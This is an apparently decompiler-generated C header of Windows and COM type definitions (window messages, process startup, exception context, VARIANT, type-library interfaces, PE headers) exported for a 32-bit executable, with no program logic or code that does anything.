typedef unsigned char   undefined;

typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
float10
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef short    wchar_t;
typedef unsigned short    word;
typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef unsigned short    wchar16;
typedef struct tagMSG tagMSG, *PtagMSG;

typedef struct tagMSG MSG;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

typedef uint UINT;

typedef uint UINT_PTR;

typedef UINT_PTR WPARAM;

typedef long LONG_PTR;

typedef LONG_PTR LPARAM;

typedef ulong DWORD;

typedef struct tagPOINT tagPOINT, *PtagPOINT;

typedef struct tagPOINT POINT;

typedef long LONG;

struct tagPOINT {
    LONG x;
    LONG y;
};

struct tagMSG {
    HWND hwnd;
    UINT message;
    WPARAM wParam;
    LPARAM lParam;
    DWORD time;
    POINT pt;
};

struct HWND__ {
    int unused;
};

typedef struct tagMSG *LPMSG;

typedef struct _GUID _GUID, *P_GUID;

typedef struct _GUID GUID;

struct _GUID {
    ulong Data1;
    ushort Data2;
    ushort Data3;
    uchar Data4[8];
};

typedef GUID IID;

typedef struct _cpinfo _cpinfo, *P_cpinfo;

typedef uchar BYTE;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef int BOOL;

typedef char CHAR;

typedef CHAR *LPSTR;

typedef BOOL (*CALINFO_ENUMPROCA)(LPSTR);

typedef struct _cpinfo *LPCPINFO;

typedef DWORD LCTYPE;

typedef DWORD CALID;

typedef DWORD CALTYPE;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef ushort WORD;

typedef BYTE *LPBYTE;

typedef void *HANDLE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _WIN32_FIND_DATAA _WIN32_FIND_DATAA, *P_WIN32_FIND_DATAA;

typedef struct _WIN32_FIND_DATAA *LPWIN32_FIND_DATAA;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

struct _WIN32_FIND_DATAA {
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
    DWORD dwReserved0;
    DWORD dwReserved1;
    CHAR cFileName[260];
    CHAR cAlternateFileName[14];
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

typedef struct _SYSTEMTIME SYSTEMTIME;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION *PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG *PRTL_CRITICAL_SECTION_DEBUG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION *CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef struct _SYSTEMTIME *LPSYSTEMTIME;

typedef struct _MEMORY_BASIC_INFORMATION _MEMORY_BASIC_INFORMATION, *P_MEMORY_BASIC_INFORMATION;

typedef ULONG_PTR SIZE_T;

struct _MEMORY_BASIC_INFORMATION {
    PVOID BaseAddress;
    PVOID AllocationBase;
    DWORD AllocationProtect;
    SIZE_T RegionSize;
    DWORD State;
    DWORD Protect;
    DWORD Type;
};

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

typedef double ULONGLONG;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef wchar_t WCHAR;

typedef WCHAR *LPWSTR;

typedef WCHAR *LPCWSTR;

typedef long HRESULT;

typedef CHAR *LPCSTR;

typedef struct _MEMORY_BASIC_INFORMATION *PMEMORY_BASIC_INFORMATION;

typedef LONG *PLONG;

typedef struct _OSVERSIONINFOA _OSVERSIONINFOA, *P_OSVERSIONINFOA;

struct _OSVERSIONINFOA {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    CHAR szCSDVersion[128];
};

typedef struct _OSVERSIONINFOA *LPOSVERSIONINFOA;

typedef CONTEXT *PCONTEXT;

typedef short SHORT;

typedef DWORD ACCESS_MASK;

typedef DWORD LCID;

typedef CHAR *PCNZCH;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[192]; // Actual DOS program
};

typedef struct tagFUNCDESC tagFUNCDESC, *PtagFUNCDESC;

typedef LONG DISPID;

typedef DISPID MEMBERID;

typedef LONG SCODE;

typedef struct tagELEMDESC tagELEMDESC, *PtagELEMDESC;

typedef struct tagELEMDESC ELEMDESC;

typedef enum tagFUNCKIND {
    FUNC_VIRTUAL=0,
    FUNC_PUREVIRTUAL=1,
    FUNC_NONVIRTUAL=2,
    FUNC_STATIC=3,
    FUNC_DISPATCH=4
} tagFUNCKIND;

typedef enum tagFUNCKIND FUNCKIND;

typedef enum tagINVOKEKIND {
    INVOKE_FUNC=1,
    INVOKE_PROPERTYGET=2,
    INVOKE_PROPERTYPUT=4,
    INVOKE_PROPERTYPUTREF=8
} tagINVOKEKIND;

typedef enum tagINVOKEKIND INVOKEKIND;

typedef enum tagCALLCONV {
    CC_FASTCALL=0,
    CC_CDECL=1,
    CC_MSCPASCAL=2,
    CC_PASCAL=3,
    CC_MACPASCAL=4,
    CC_STDCALL=5,
    CC_FPFASTCALL=6,
    CC_SYSCALL=7,
    CC_MPWCDECL=8,
    CC_MPWPASCAL=9,
    CC_MAX=10
} tagCALLCONV;

typedef enum tagCALLCONV CALLCONV;

typedef struct tagTYPEDESC tagTYPEDESC, *PtagTYPEDESC;

typedef struct tagTYPEDESC TYPEDESC;

typedef union _union_2702 _union_2702, *P_union_2702;

typedef union _union_2691 _union_2691, *P_union_2691;

typedef ushort VARTYPE;

typedef struct tagIDLDESC tagIDLDESC, *PtagIDLDESC;

typedef struct tagIDLDESC IDLDESC;

typedef struct tagPARAMDESC tagPARAMDESC, *PtagPARAMDESC;

typedef struct tagPARAMDESC PARAMDESC;

typedef struct tagARRAYDESC tagARRAYDESC, *PtagARRAYDESC;

typedef DWORD HREFTYPE;

typedef ushort USHORT;

typedef struct tagPARAMDESCEX tagPARAMDESCEX, *PtagPARAMDESCEX;

typedef struct tagPARAMDESCEX *LPPARAMDESCEX;

typedef struct tagSAFEARRAYBOUND tagSAFEARRAYBOUND, *PtagSAFEARRAYBOUND;

typedef struct tagSAFEARRAYBOUND SAFEARRAYBOUND;

typedef DWORD ULONG;

typedef struct tagVARIANT tagVARIANT, *PtagVARIANT;

typedef struct tagVARIANT VARIANT;

typedef VARIANT VARIANTARG;

typedef union _union_2683 _union_2683, *P_union_2683;

typedef struct __tagVARIANT __tagVARIANT, *P__tagVARIANT;

typedef struct tagDEC tagDEC, *PtagDEC;

typedef struct tagDEC DECIMAL;

typedef union _union_2685 _union_2685, *P_union_2685;

typedef union _union_1695 _union_1695, *P_union_1695;

typedef union _union_1697 _union_1697, *P_union_1697;

typedef float FLOAT;

typedef double DOUBLE;

typedef short VARIANT_BOOL;

typedef union tagCY tagCY, *PtagCY;

typedef union tagCY CY;

typedef double DATE;

typedef WCHAR OLECHAR;

typedef OLECHAR *BSTR;

typedef struct IUnknown IUnknown, *PIUnknown;

typedef struct IDispatch IDispatch, *PIDispatch;

typedef struct tagSAFEARRAY tagSAFEARRAY, *PtagSAFEARRAY;

typedef struct tagSAFEARRAY SAFEARRAY;

typedef int INT;

typedef struct __tagBRECORD __tagBRECORD, *P__tagBRECORD;

typedef struct _struct_1696 _struct_1696, *P_struct_1696;

typedef struct _struct_1698 _struct_1698, *P_struct_1698;

typedef struct _struct_1693 _struct_1693, *P_struct_1693;

typedef struct IUnknownVtbl IUnknownVtbl, *PIUnknownVtbl;

typedef struct IDispatchVtbl IDispatchVtbl, *PIDispatchVtbl;

typedef struct ITypeInfo ITypeInfo, *PITypeInfo;

typedef OLECHAR *LPOLESTR;

typedef struct tagDISPPARAMS tagDISPPARAMS, *PtagDISPPARAMS;

typedef struct tagDISPPARAMS DISPPARAMS;

typedef struct tagEXCEPINFO tagEXCEPINFO, *PtagEXCEPINFO;

typedef struct tagEXCEPINFO EXCEPINFO;

typedef struct IRecordInfo IRecordInfo, *PIRecordInfo;

typedef struct ITypeInfoVtbl ITypeInfoVtbl, *PITypeInfoVtbl;

typedef struct tagTYPEATTR tagTYPEATTR, *PtagTYPEATTR;

typedef struct tagTYPEATTR TYPEATTR;

typedef struct ITypeComp ITypeComp, *PITypeComp;

typedef struct tagFUNCDESC FUNCDESC;

typedef struct tagVARDESC tagVARDESC, *PtagVARDESC;

typedef struct tagVARDESC VARDESC;

typedef struct ITypeLib ITypeLib, *PITypeLib;

typedef struct IRecordInfoVtbl IRecordInfoVtbl, *PIRecordInfoVtbl;

typedef OLECHAR *LPCOLESTR;

typedef enum tagTYPEKIND {
    TKIND_ENUM=0,
    TKIND_RECORD=1,
    TKIND_MODULE=2,
    TKIND_INTERFACE=3,
    TKIND_DISPATCH=4,
    TKIND_COCLASS=5,
    TKIND_ALIAS=6,
    TKIND_UNION=7,
    TKIND_MAX=8
} tagTYPEKIND;

typedef enum tagTYPEKIND TYPEKIND;

typedef struct ITypeCompVtbl ITypeCompVtbl, *PITypeCompVtbl;

typedef enum tagDESCKIND {
    DESCKIND_NONE=0,
    DESCKIND_FUNCDESC=1,
    DESCKIND_VARDESC=2,
    DESCKIND_TYPECOMP=3,
    DESCKIND_IMPLICITAPPOBJ=4,
    DESCKIND_MAX=5
} tagDESCKIND;

typedef enum tagDESCKIND DESCKIND;

typedef union tagBINDPTR tagBINDPTR, *PtagBINDPTR;

typedef union tagBINDPTR BINDPTR;

typedef union _union_2711 _union_2711, *P_union_2711;

typedef enum tagVARKIND {
    VAR_PERINSTANCE=0,
    VAR_STATIC=1,
    VAR_CONST=2,
    VAR_DISPATCH=3
} tagVARKIND;

typedef enum tagVARKIND VARKIND;

typedef struct ITypeLibVtbl ITypeLibVtbl, *PITypeLibVtbl;

typedef struct tagTLIBATTR tagTLIBATTR, *PtagTLIBATTR;

typedef struct tagTLIBATTR TLIBATTR;

typedef enum tagSYSKIND {
    SYS_WIN16=0,
    SYS_WIN32=1,
    SYS_MAC=2,
    SYS_WIN64=3
} tagSYSKIND;

typedef enum tagSYSKIND SYSKIND;

struct _struct_1693 {
    ulong Lo;
    long Hi;
};

union tagCY {
    struct _struct_1693 s;
    LONGLONG int64;
};

struct _struct_1698 {
    ULONG Lo32;
    ULONG Mid32;
};

union _union_1697 {
    struct _struct_1698 s2;
    ULONGLONG Lo64;
};

struct _struct_1696 {
    BYTE scale;
    BYTE sign;
};

union _union_1695 {
    struct _struct_1696 s;
    USHORT signscale;
};

struct tagDEC {
    USHORT wReserved;
    union _union_1695 u;
    ULONG Hi32;
    union _union_1697 u2;
};

struct __tagBRECORD {
    PVOID pvRecord;
    struct IRecordInfo *pRecInfo;
};

union _union_2685 {
    LONGLONG llVal;
    LONG lVal;
    BYTE bVal;
    SHORT iVal;
    FLOAT fltVal;
    DOUBLE dblVal;
    VARIANT_BOOL boolVal;
    SCODE scode;
    CY cyVal;
    DATE date;
    BSTR bstrVal;
    struct IUnknown *punkVal;
    struct IDispatch *pdispVal;
    SAFEARRAY *parray;
    BYTE *pbVal;
    SHORT *piVal;
    LONG *plVal;
    LONGLONG *pllVal;
    FLOAT *pfltVal;
    DOUBLE *pdblVal;
    VARIANT_BOOL *pboolVal;
    SCODE *pscode;
    CY *pcyVal;
    DATE *pdate;
    BSTR *pbstrVal;
    struct IUnknown **ppunkVal;
    struct IDispatch **ppdispVal;
    SAFEARRAY **pparray;
    VARIANT *pvarVal;
    PVOID byref;
    CHAR cVal;
    USHORT uiVal;
    ULONG ulVal;
    ULONGLONG ullVal;
    INT intVal;
    UINT uintVal;
    DECIMAL *pdecVal;
    CHAR *pcVal;
    USHORT *puiVal;
    ULONG *pulVal;
    ULONGLONG *pullVal;
    INT *pintVal;
    UINT *puintVal;
    struct __tagBRECORD brecVal;
};

struct __tagVARIANT {
    VARTYPE vt;
    WORD wReserved1;
    WORD wReserved2;
    WORD wReserved3;
    union _union_2685 n3;
};

union _union_2683 {
    struct __tagVARIANT n2;
    DECIMAL decVal;
};

union _union_2691 {
    struct tagTYPEDESC *lptdesc;
    struct tagARRAYDESC *lpadesc;
    HREFTYPE hreftype;
};

struct tagTYPEDESC {
    union _union_2691 u;
    VARTYPE vt;
};

struct tagIDLDESC {
    ULONG_PTR dwReserved;
    USHORT wIDLFlags;
};

struct tagPARAMDESC {
    LPPARAMDESCEX pparamdescex;
    USHORT wParamFlags;
};

union _union_2702 {
    IDLDESC idldesc;
    PARAMDESC paramdesc;
};

struct tagELEMDESC {
    TYPEDESC tdesc;
    union _union_2702 u;
};

struct tagFUNCDESC {
    MEMBERID memid;
    SCODE *lprgscode;
    ELEMDESC *lprgelemdescParam;
    FUNCKIND funckind;
    INVOKEKIND invkind;
    CALLCONV callconv;
    SHORT cParams;
    SHORT cParamsOpt;
    SHORT oVft;
    SHORT cScodes;
    ELEMDESC elemdescFunc;
    WORD wFuncFlags;
};

struct tagVARIANT {
    union _union_2683 n1;
};

struct tagPARAMDESCEX {
    ULONG cBytes;
    VARIANTARG varDefaultValue;
};

union _union_2711 {
    ULONG oInst;
    VARIANT *lpvarValue;
};

struct tagVARDESC {
    MEMBERID memid;
    LPOLESTR lpstrSchema;
    union _union_2711 u;
    ELEMDESC elemdescVar;
    WORD wVarFlags;
    VARKIND varkind;
};

struct ITypeCompVtbl {
    HRESULT (*QueryInterface)(struct ITypeComp *, IID *, void **);
    ULONG (*AddRef)(struct ITypeComp *);
    ULONG (*Release)(struct ITypeComp *);
    HRESULT (*Bind)(struct ITypeComp *, LPOLESTR, ULONG, WORD, struct ITypeInfo **, DESCKIND *, BINDPTR *);
    HRESULT (*BindType)(struct ITypeComp *, LPOLESTR, ULONG, struct ITypeInfo **, struct ITypeComp **);
};

struct tagSAFEARRAYBOUND {
    ULONG cElements;
    LONG lLbound;
};

struct tagSAFEARRAY {
    USHORT cDims;
    USHORT fFeatures;
    ULONG cbElements;
    ULONG cLocks;
    PVOID pvData;
    SAFEARRAYBOUND rgsabound[1];
};

struct ITypeInfoVtbl {
    HRESULT (*QueryInterface)(struct ITypeInfo *, IID *, void **);
    ULONG (*AddRef)(struct ITypeInfo *);
    ULONG (*Release)(struct ITypeInfo *);
    HRESULT (*GetTypeAttr)(struct ITypeInfo *, TYPEATTR **);
    HRESULT (*GetTypeComp)(struct ITypeInfo *, struct ITypeComp **);
    HRESULT (*GetFuncDesc)(struct ITypeInfo *, UINT, FUNCDESC **);
    HRESULT (*GetVarDesc)(struct ITypeInfo *, UINT, VARDESC **);
    HRESULT (*GetNames)(struct ITypeInfo *, MEMBERID, BSTR *, UINT, UINT *);
    HRESULT (*GetRefTypeOfImplType)(struct ITypeInfo *, UINT, HREFTYPE *);
    HRESULT (*GetImplTypeFlags)(struct ITypeInfo *, UINT, INT *);
    HRESULT (*GetIDsOfNames)(struct ITypeInfo *, LPOLESTR *, UINT, MEMBERID *);
    HRESULT (*Invoke)(struct ITypeInfo *, PVOID, MEMBERID, WORD, DISPPARAMS *, VARIANT *, EXCEPINFO *, UINT *);
    HRESULT (*GetDocumentation)(struct ITypeInfo *, MEMBERID, BSTR *, BSTR *, DWORD *, BSTR *);
    HRESULT (*GetDllEntry)(struct ITypeInfo *, MEMBERID, INVOKEKIND, BSTR *, BSTR *, WORD *);
    HRESULT (*GetRefTypeInfo)(struct ITypeInfo *, HREFTYPE, struct ITypeInfo **);
    HRESULT (*AddressOfMember)(struct ITypeInfo *, MEMBERID, INVOKEKIND, PVOID *);
    HRESULT (*CreateInstance)(struct ITypeInfo *, struct IUnknown *, IID *, PVOID *);
    HRESULT (*GetMops)(struct ITypeInfo *, MEMBERID, BSTR *);
    HRESULT (*GetContainingTypeLib)(struct ITypeInfo *, struct ITypeLib **, UINT *);
    void (*ReleaseTypeAttr)(struct ITypeInfo *, TYPEATTR *);
    void (*ReleaseFuncDesc)(struct ITypeInfo *, FUNCDESC *);
    void (*ReleaseVarDesc)(struct ITypeInfo *, VARDESC *);
};

struct ITypeLibVtbl {
    HRESULT (*QueryInterface)(struct ITypeLib *, IID *, void **);
    ULONG (*AddRef)(struct ITypeLib *);
    ULONG (*Release)(struct ITypeLib *);
    UINT (*GetTypeInfoCount)(struct ITypeLib *);
    HRESULT (*GetTypeInfo)(struct ITypeLib *, UINT, struct ITypeInfo **);
    HRESULT (*GetTypeInfoType)(struct ITypeLib *, UINT, TYPEKIND *);
    HRESULT (*GetTypeInfoOfGuid)(struct ITypeLib *, GUID *, struct ITypeInfo **);
    HRESULT (*GetLibAttr)(struct ITypeLib *, TLIBATTR **);
    HRESULT (*GetTypeComp)(struct ITypeLib *, struct ITypeComp **);
    HRESULT (*GetDocumentation)(struct ITypeLib *, INT, BSTR *, BSTR *, DWORD *, BSTR *);
    HRESULT (*IsName)(struct ITypeLib *, LPOLESTR, ULONG, BOOL *);
    HRESULT (*FindName)(struct ITypeLib *, LPOLESTR, ULONG, struct ITypeInfo **, MEMBERID *, USHORT *);
    void (*ReleaseTLibAttr)(struct ITypeLib *, TLIBATTR *);
};

struct tagTLIBATTR {
    GUID guid;
    LCID lcid;
    SYSKIND syskind;
    WORD wMajorVerNum;
    WORD wMinorVerNum;
    WORD wLibFlags;
};

struct tagARRAYDESC {
    TYPEDESC tdescElem;
    USHORT cDims;
    SAFEARRAYBOUND rgbounds[1];
};

struct ITypeComp {
    struct ITypeCompVtbl *lpVtbl;
};

struct IRecordInfo {
    struct IRecordInfoVtbl *lpVtbl;
};

struct tagTYPEATTR {
    GUID guid;
    LCID lcid;
    DWORD dwReserved;
    MEMBERID memidConstructor;
    MEMBERID memidDestructor;
    LPOLESTR lpstrSchema;
    ULONG cbSizeInstance;
    TYPEKIND typekind;
    WORD cFuncs;
    WORD cVars;
    WORD cImplTypes;
    WORD cbSizeVft;
    WORD cbAlignment;
    WORD wTypeFlags;
    WORD wMajorVerNum;
    WORD wMinorVerNum;
    TYPEDESC tdescAlias;
    IDLDESC idldescType;
};

struct IRecordInfoVtbl {
    HRESULT (*QueryInterface)(struct IRecordInfo *, IID *, void **);
    ULONG (*AddRef)(struct IRecordInfo *);
    ULONG (*Release)(struct IRecordInfo *);
    HRESULT (*RecordInit)(struct IRecordInfo *, PVOID);
    HRESULT (*RecordClear)(struct IRecordInfo *, PVOID);
    HRESULT (*RecordCopy)(struct IRecordInfo *, PVOID, PVOID);
    HRESULT (*GetGuid)(struct IRecordInfo *, GUID *);
    HRESULT (*GetName)(struct IRecordInfo *, BSTR *);
    HRESULT (*GetSize)(struct IRecordInfo *, ULONG *);
    HRESULT (*GetTypeInfo)(struct IRecordInfo *, struct ITypeInfo **);
    HRESULT (*GetField)(struct IRecordInfo *, PVOID, LPCOLESTR, VARIANT *);
    HRESULT (*GetFieldNoCopy)(struct IRecordInfo *, PVOID, LPCOLESTR, VARIANT *, PVOID *);
    HRESULT (*PutField)(struct IRecordInfo *, ULONG, PVOID, LPCOLESTR, VARIANT *);
    HRESULT (*PutFieldNoCopy)(struct IRecordInfo *, ULONG, PVOID, LPCOLESTR, VARIANT *);
    HRESULT (*GetFieldNames)(struct IRecordInfo *, ULONG *, BSTR *);
    BOOL (*IsMatchingType)(struct IRecordInfo *, struct IRecordInfo *);
    PVOID (*RecordCreate)(struct IRecordInfo *);
    HRESULT (*RecordCreateCopy)(struct IRecordInfo *, PVOID, PVOID *);
    HRESULT (*RecordDestroy)(struct IRecordInfo *, PVOID);
};

struct tagDISPPARAMS {
    VARIANTARG *rgvarg;
    DISPID *rgdispidNamedArgs;
    UINT cArgs;
    UINT cNamedArgs;
};

union tagBINDPTR {
    FUNCDESC *lpfuncdesc;
    VARDESC *lpvardesc;
    struct ITypeComp *lptcomp;
};

struct IDispatch {
    struct IDispatchVtbl *lpVtbl;
};

struct IUnknownVtbl {
    HRESULT (*QueryInterface)(struct IUnknown *, IID *, void **);
    ULONG (*AddRef)(struct IUnknown *);
    ULONG (*Release)(struct IUnknown *);
};

struct IDispatchVtbl {
    HRESULT (*QueryInterface)(struct IDispatch *, IID *, void **);
    ULONG (*AddRef)(struct IDispatch *);
    ULONG (*Release)(struct IDispatch *);
    HRESULT (*GetTypeInfoCount)(struct IDispatch *, UINT *);
    HRESULT (*GetTypeInfo)(struct IDispatch *, UINT, LCID, struct ITypeInfo **);
    HRESULT (*GetIDsOfNames)(struct IDispatch *, IID *, LPOLESTR *, UINT, LCID, DISPID *);
    HRESULT (*Invoke)(struct IDispatch *, DISPID, IID *, LCID, WORD, DISPPARAMS *, VARIANT *, EXCEPINFO *, UINT *);
};

struct IUnknown {
    struct IUnknownVtbl *lpVtbl;
};

struct ITypeLib {
    struct ITypeLibVtbl *lpVtbl;
};

struct ITypeInfo {
    struct ITypeInfoVtbl *lpVtbl;
};

struct tagEXCEPINFO {
    WORD wCode;
    WORD wReserved;
    BSTR bstrSource;
    BSTR bstrDescription;
    BSTR bstrHelpFile;
    DWORD dwHelpContext;
    PVOID pvReserved;
    HRESULT (*pfnDeferredFillIn)(struct tagEXCEPINFO *);
    SCODE scode;
};

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef DWORD *LPDWORD;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

struct HINSTANCE__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef HANDLE HLOCAL;

typedef struct _FILETIME *LPFILETIME;

typedef int (*FARPROC)(void);

typedef WORD *LPWORD;

typedef struct HKEY__ *HKEY;

typedef HKEY *PHKEY;

typedef LONG_PTR LRESULT;

typedef HANDLE HGLOBAL;

typedef BOOL *LPBOOL;

typedef void *LPCVOID;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

